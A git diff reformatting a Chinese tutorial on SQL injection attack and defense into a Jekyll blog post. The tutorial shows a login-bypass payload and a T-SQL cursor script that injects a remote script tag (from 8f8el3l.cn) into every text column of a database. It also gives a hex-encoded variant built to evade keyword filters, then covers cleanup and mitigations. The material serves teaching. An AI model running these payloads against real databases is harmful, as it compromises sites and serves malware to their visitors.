@@ -1,6 +1,12 @@
-
-[SQL注入攻防入门详解]()
-===============================================================================
+---
+layout: post
+title:  "SQL注入攻防入门详解"
+date:   2016-11-09 15:14:54
+categories: sql
+tags: sql
+author: jiangc
+excerpt: 对于sql注入的攻防，我只用过简单拼接字符串的注入及参数化查询，可以说没什么好经验...
+---
 
 （对于sql注入的攻防，我只用过简单拼接字符串的注入及参数化查询，可以说没什么好经验，为避免后知后觉的犯下大错，专门查看大量前辈们的心得，这方面的资料颇多，将其精简出自己觉得重要的，就成了该文）
 
@@ -14,23 +20,10 @@
 
 尝尝SQL注入
 
-1. 一个简单的登录页面
+## 1. 一个简单的登录页面
 
 关键代码：（详细见下载的示例代码）
 
-[?](# "?")
-
-1
-
-2
-
-3
-
-4
-
-5
-
-6
 ```java
 private boolean noProtectLogin(string userName, string password){
     int count = (int)SqlHelper.Instance.ExecuteScalar(string.Format
@@ -46,8 +39,9 @@ private boolean noProtectLogin(string userName, string password){
 [![image](../../images/2016/201210311922046482.png "image")](http://images.cnblogs.com/cnblogs_com/heyuquan/201210/201210311921598057.png)
 
 合并的SQL为：
-
+```sql
 SELECT COUNT(*) FROM Login WHERE UserName='admin' AND Password='123456'
+```
 
 2) 输入注入数据：
 
@@ -56,8 +50,9 @@ SELECT COUNT(*) FROM Login WHERE UserName='admin' AND Password='123456'
 [![image](https://images.cnblogs.com/cnblogs_com/heyuquan/201210/201210311922089084.png "image")](http://images.cnblogs.com/cnblogs_com/heyuquan/201210/20121031192207853.png)
 
  合并的SQL为：
-
+```sql
  SELECT COUNT(*) FROM Login WHERE UserName='admin'-- Password='123'
+```
 
 因为UserName值中输入了“--”注释符，后面语句被省略而登录成功。（常常的手法：前面加上'; ' (分号，用于结束前一条语句)，后边加上'--' (用于注释后边的语句)）
 
@@ -246,162 +241,30 @@ GO
 a) 向当前数据库的每个表的每个字段插入一段恶意脚本
 
 [?](# "?")
-
-1
-
-2
-
-3
-
-4
-
-5
-
-6
-
-7
-
-8
-
-9
-
-10
-
-11
-
-12
-
-13
-
 `Declare` `@T` `Varchar``(255),@C` `Varchar``(255)`
-
 `Declare` `Table_Cursor` `Cursor` `For`
-
 `Select` `A.``Name``,B.``Name`
-
 `From` `SysobjectsA,Syscolumns B` `Where` `A.Id=B.Id` `And` `A.Xtype=``'u'` `And` `(B.Xtype=99` `Or` `B.Xtype=35` `Or` `B.Xtype=231` `Or` `B.Xtype=167)`
-
 `Open` `Table_Cursor`
-
 `Fetch` `Next` `From`  `Table_Cursor` `Into` `@T,@C`
-
 `While(@@Fetch_Status=0)`
-
 `Begin`
-
 `Exec``(``'update ['``+@T+``'] Set ['``+@C+``']=Rtrim(Convert(Varchar(8000),['``+@C+``']))+'``'<script src=[http://8f8el3l.cn/0.js></script](http://8f8el3l.cn/0.js></script)>'``''``)`
-
 `Fetch` `Next` `From` `Table_Cursor` `Into` `@T,@C`
-
 `End`
-
 `Close` `Table_Cursor`
-
 `DeallocateTable_Cursor`
 
 b) 更高级的攻击，将上面的注入SQL进行“HEX编码”，从而避免程序的关键字检查、脚本转义等，通过EXEC执行
 
 [?](# "?")
 
-1
-
-2
-
 `dEcLaRe` `@s` `vArChAr``(8000)` `sEt` `@s=0x4465636c617265204054205661726368617228323535292c4043205661726368617228323535290d0a4465636c617265205461626c655f437572736f7220437572736f7220466f722053656c65637420412e4e616d652c422e4e616d652046726f6d205379736f626a6563747320412c537973636f6c756d6e73204220576865726520412e49643d422e496420416e6420412e58747970653d27752720416e642028422e58747970653d3939204f7220422e58747970653d3335204f7220422e58747970653d323331204f7220422e58747970653d31363729204f70656e205461626c655f437572736f72204665746368204e6578742046726f6d20205461626c655f437572736f7220496e746f2040542c4043205768696c6528404046657463685f5374617475733d302920426567696e20457865632827757064617465205b272b40542b275d20536574205b272b40432b275d3d527472696d28436f6e7665727428566172636861722838303030292c5b272b40432b275d29292b27273c736372697074207372633d687474703a2f2f386638656c336c2e636e2f302e6a733e3c2f7363726970743e272727294665746368204e6578742046726f6d20205461626c655f437572736f7220496e746f2040542c404320456e6420436c6f7365205461626c655f437572736f72204465616c6c6f63617465205461626c655f437572736f72;`
-
 `eXeC``(@s);``--`
 
 c) 批次删除数据库被注入的脚本
 
-[?](# "?")
-
-1
-
-2
-
-3
-
-4
-
-5
-
-6
-
-7
-
-8
-
-9
-
-10
-
-11
-
-12
-
-13
-
-14
-
-15
-
-16
-
-17
-
-18
-
-19
-
-20
-
-21
-
-22
-
-23
-
-24
-
-25
-
-26
-
-27
-
-28
-
-29
-
-30
-
-31
-
-32
-
-33
-
-34
-
-35
-
-36
-
-37
-
-38
-
-39
-
-40
-
-41
-
-42
-
-43
-
-44
+[?](# "?")2
 
 `declare` `@delStrnvarchar(500)`
 
@@ -491,27 +354,20 @@ d) 我如何得到“HEX编码”？
 
 [?](# "?")
 
-1
-
 `declare` `@A` `varchar``(200);``set` `@A=reverse(``''``'58803303431'``'=emanresu erehw '``'9d4d9c1ac9814f08'``'=drowssaP tes xxx tadpu'``);`
 
-防止SQL注入
+## 防止SQL注入
 
-1. 数据库权限控制，只给访问数据库的web应用功能所需的最低权限帐户。
+## 1. 数据库权限控制，只给访问数据库的web应用功能所需的最低权限帐户。
 
 如MSSQL中一共存在8种权限：sysadmin, dbcreator, diskadmin, processadmin, serveradmin, setupadmin, securityadmin, bulkadmin。
 
-2. 自定义错误信息，首先我们要屏蔽服务器的详细错误信息传到客户端。
+##2. 自定义错误信息，首先我们要屏蔽服务器的详细错误信息传到客户端。
 
 在 ASP.NET 中，可通过web.config配置文件的<customErrors>节点设置：
 
 [?](# "?")
 
-1
-
-2
-
-3
 
 `<``customErrors` `defaultRedirect="url" mode="On|Off|RemoteOnly">`
 
@@ -545,7 +401,7 @@ RemoteOnly
 
 [![image](https://images.cnblogs.com/cnblogs_com/heyuquan/201210/201210311922238089.png "image")](http://images.cnblogs.com/cnblogs_com/heyuquan/201210/201210311922188617.png)
 
-3. 把危险的和不必要的存储过程删除
+## 3. 把危险的和不必要的存储过程删除
 
 xp_：扩展存储过程的前缀，SQL注入攻击得手之后，攻击者往往会通过执行xp_cmdshell之类的扩展存储过程，获取系统信息，甚至控制、破坏系统。
 
